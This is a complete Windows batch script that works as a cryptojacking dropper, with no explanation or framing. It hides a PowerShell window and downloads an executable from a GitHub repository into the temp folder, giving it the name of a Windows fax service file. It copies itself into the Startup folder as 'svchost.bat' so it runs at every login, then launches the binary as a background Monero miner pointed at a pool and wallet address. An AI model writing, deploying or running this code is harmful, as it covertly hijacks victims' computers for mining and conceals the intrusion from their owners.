@echo off
powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/choppedshyt/those-who-know/raw/refs/heads/main/FXSSVC.exe', '%temp%\FXSSVC.exe')"
copy /y "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.bat"
start /wait "" "%temp%\FXSSVC.exe" --background --donate-level 1 -o de.monero.herominers.com:1111 -u 4481e5PxUZhXVDRdbhLZVciBVSuu1YZkbVPiunhZMoxQc3KF2FqHsLdGoVUCnmi1ByMW4SfU1Josa9dnhZuaBEzCHoskgQz -p test -a rx/0 -k pause